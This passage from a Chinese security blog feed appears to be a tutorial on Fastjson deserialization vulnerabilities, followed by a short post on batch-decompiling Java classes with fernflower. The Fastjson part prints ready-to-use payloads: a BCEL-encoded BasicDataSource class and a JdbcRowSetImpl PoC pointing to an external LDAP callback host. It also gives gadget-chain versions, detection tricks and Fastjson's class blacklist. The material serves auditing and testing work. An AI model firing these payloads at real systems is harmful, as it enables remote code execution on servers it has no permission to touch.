125;</span><br><span class="line"></span><br><span class="line">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&#123;&quot;@type&quot;: &quot;org.apache.tomcat.dbcp.dbcp.BasicDataSource&quot;,&quot;driverClassLoader&quot;: &#123;&quot;@type&quot;: &quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;&#125;,&quot;driverClassName&quot;: &quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$7d$91$cfN$C1$Q$c6$bf$c2$$$c5$ba$C$o$e2$3fD$b8$n$HI$bcJ$bc$YM$d0U$P$Q$8e$seidq$dd$dd$y$8b$f1$8d$3csQ$e3$c1$H$f0$a1$8c$b3$F5$5el$d2$99$ce7$9d_$a7$ed$c7$e7$db$3b$80C$d4$F$b2$d801$li$81Mlql$L$98$d8$e1$a8p$ec2d$da$ae$ef$c6$c7$M$e9$c6$7e$9f$c18$J$86$8a$no$bb$be$ba$9a$de$PT$d4$93$D$8f$94$a2$j8$d2$eb$cb$c8M$e2$85h$c4$pw$c2$c0$ed$89$a7Tx$c4$90m$3b$de$82$c7$u_$b3$c7$f2A$b6$3c$e9$df$b6$3a$7e$ac$a2h$g$c6jx$fa$e8$a80v$D$9f$wV$ba$b1t$ee$$e$a8$91$d4$j$83$e8$G$d3$c8Qgnr$84$d0$e8$83$84ca$J$82$a3j$a1$82$3d$86$ea$ffl$L5$I$GS$d73$U$7ew_$P$c6$ca$89$ffH$bdQ$a4$e4$90$$$d48O$5e$n$lF$ae$l$eb$cez$91t$U$ea$e0$f4$94$c9H$81$rm$90$5d$a6$a8E$9e$917$9b$_$603$9d$b6$c8f$b4H$97$pk$cd7$m$87$3c$f9$y$K$3f$c57$g$G$e4KH$bd$c2xB$f6$a2$f9$8c$ccL$8b$Z$3a$c5DZ$e3$caH$fe$d0$m$8dkU$d0$wG$a8o$bc$a0$dc$w$8a$U$ad$d1$e4Hu8J$G$r$d6uG$e5$_$H$X$vT$R$C$A$A&quot;&#125;</span><br></pre></td></tr></table></figure><h2 id="黑白盒测试方法"><a href="#黑白盒测试方法" class="headerlink" title="黑白盒测试方法"></a>黑白盒测试方法</h2><h3 id="利用链及版本"><a href="#利用链及版本" class="headerlink" title="利用链及版本"></a>利用链及版本</h3><table><thead><tr><th>Payload</th><th>PayloadType</th><th>Dependencies</th></tr></thead><tbody><tr><td>BasicDataSource</td><td>local</td><td>tomcat-dbcp:7.x, tomcat-dbcp:9.x, commons-dbcp:1.4</td></tr><tr><td>JdbcRowSetImpl</td><td>jndi</td><td>Fastjson 1.2.47及以下</td></tr><tr><td>TemplatesImp</td><td>local</td><td>need Feature.SupportNonPublicField</td></tr></tbody></table><h3 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h3><p>  1.目标站点如果报错的话一般使用不闭合{花括号或者多添加”双引号来进行测试</p><p>  2.fastjson与jackson区别，如果请求包中的 json 如下:<br>    {“name”:”S”, “age”:21}<br>    追加一个随机 key ,修改 json 为<br>    {“name”:”S”, “age”:21,”agsbdkjada__ss_d”:123}<br>    这里 fastjson 是不会报错的, Jackson 因为强制 key 与 javabean 属性对齐,只能 少不能多 key,<br>    所以会报错,服务器的响应包中多少会有异常回显</p><p>  3.dos检测 dos<br>    {“a:”\x  看返回时间</p><p>  4.如果是json字符串中name字段存在反序列化<br>    {“id”:”1”,”name”:”wangwei”}那么poc就是<br>    {“id”:”1”,”name”:{“@type”:”java.lang.Class”,”val”:”com.sun.rowset.JdbcRowSetImpl”},”x”:{“@type”:”com.sun.rowset.JdbcRowSetImpl”,”dataSourceName”:”ldap://fatjaon.tuq75v.ceye.io”,”autoCommit”:true}}</p><p><strong>小tips</strong><br>1.在测试过程中发现只要回显比较慢，或者感觉卡顿都有可能是正在执行命令，所以比较慢<br>2.poc.java文件用低版本的java环境编译，因为java是向下兼容的，防止目标环境加载的时候运行报错，最好是jdk1.6</p><h3 id="白盒审计函数"><a href="#白盒审计函数" class="headerlink" title="白盒审计函数"></a>白盒审计函数</h3><p>   1.查看fastjson jar包是否小于1.2.48<br>    2.审查以下函数<br>    JSON.parseObject（）<br>    JSONObject.parseObject（）<br>    JSON.parseAarry（）</p><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><p><code>config.checkAutoType(typeName)</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">bsh</span><br><span class="line">com.mchange</span><br><span class="line">com.sun.</span><br><span class="line">java.lang.Thread</span><br><span class="line">java.net.Socket</span><br><span class="line">java.rmi</span><br><span class="line">javax.xml</span><br><span class="line">org.apache.bcel</span><br><span class="line">org.apache.commons.beanutils</span><br><span class="line">org.apache.commons.collections.Transformer</span><br><span class="line">org.apache.commons.collections.functors</span><br><span class="line">org.apache.commons.collections4.comparators</span><br><span class="line">org.apache.commons.fileupload</span><br><span class="line">org.apache.myfaces.context.servlet</span><br><span class="line">org.apache.tomcat</span><br><span class="line">org.apache.wicket.util</span><br><span class="line">org.codehaus.groovy.runtime</span><br><span class="line">org.hibernate</span><br><span class="line">org.jboss</span><br><span class="line">org.mozilla.javascript</span><br><span class="line">org.python.core</span><br><span class="line">org.springframework</span><br></pre></td></tr></table></figure><p><a href="https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5">https://github.com/alibaba/fastjson/commit/d52085ef54b32dfd963186e583cbcdfff5d101b5</a></p><p><strong>参考</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/FastjsonExploit</span><br><span class="line">https://github.com/shengqi158/fastjson-remote-code-execute-poc</span><br><span class="line">https://www.cnblogs.com/hac425/p/9800288.html</span><br><span class="line">https://blog.csdn.net/yaofeino1/article/details/76377080</span><br><span class="line">https://blog.riskivy.com/无损检测fastjson-dos漏洞以及盲区分fastjson与jackson组件/</span><br><span class="line">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;简介与漏洞史&quot;&gt;&lt;a href=&quot;#简介与漏洞史&quot; class=&quot;headerlink&quot; title=&quot;简介与漏洞史&quot;&gt;&lt;/a&gt;简介与漏洞史&lt;/h2&gt;&lt;p&gt;文章首发&lt;a href=&quot;https://xz.aliyun.com/t/7104&quot;&gt;先知&lt;/a&gt;&lt;/p&gt;

      
    
    </summary>
    
    
      <category term="反编译" scheme="http://yoursite.com/categories/%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>批量反编译class</title>
    <link href="http://yoursite.com/2017/05/26/fanbianiyi/"/>
    <id>http://yoursite.com/2017/05/26/fanbianiyi/</id>
    <published>2017-05-26T04:12:57.000Z</published>
    <updated>2020-05-27T09:30:25.190Z</updated>
    
    <content type="html"><![CDATA[<p><strong>使用<a href="http://the.bytecode.club/fernflower.jar">fernflower.jar</a> 批量反编译class</strong></p><p><strong>批量反编译</strong></p><ul><li>首先把工程的所有class压缩成classes.zip</li><li>java -jar fernflower.jar classes.zip zzCode/  （新建zzCode文件夹） </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;使用&lt;a href=&quot;http://the.bytecode.club/fernflower.jar&quot;&gt;fernflower.jar&lt;/a&gt; 批量反编译class&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;批量反编译&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
      
    
    </summary>
    
    
      <category term="反编译" scheme="http://yoursite.com/categories/%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
    
    
      <category term="java反编译工具" scheme="http://yoursite.com/tags/java%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
    
      <category term="fernflower.jar" scheme="http://yoursite.com/tags/fernflower-jar/"/>
    
  </entry>
  
</feed>
